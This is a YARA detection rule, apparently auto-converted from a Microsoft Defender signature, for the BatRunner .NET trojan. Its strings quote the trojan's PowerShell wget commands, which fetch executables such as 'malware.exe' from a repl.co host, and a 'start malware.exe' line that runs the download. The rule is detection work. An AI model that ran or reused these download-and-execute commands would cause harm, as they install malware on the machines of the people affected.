rule Trojan_MSIL_BatRunner_CXFW_2147850800_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:MSIL/BatRunner.CXFW!MTB"
        threat_id = "2147850800"
        type = "Trojan"
        platform = "MSIL: .NET intermediate language scripts"
        family = "BatRunner"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell wget https://FileUploads--asphalt.repl.co/uploads/cwod/malware.exe -outfile \"malware.exe\"" ascii //weight: 1
        $x_1_2 = "powershell wget https://FileUploads--asphalt.repl.co/uploads/cwod/coronayeahoofurpcwilldie.exe -outfile \"coronayeahoofurpcwilldie.exe\"" ascii //weight: 1
        $x_1_3 = "powershell wget https://FileUploads--asphalt.repl.co/uploads/cwod/736C6F77646F776E.exe -outfile \"736C6F77646F776E.exe\"" ascii //weight: 1
        $x_1_4 = "start malware.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

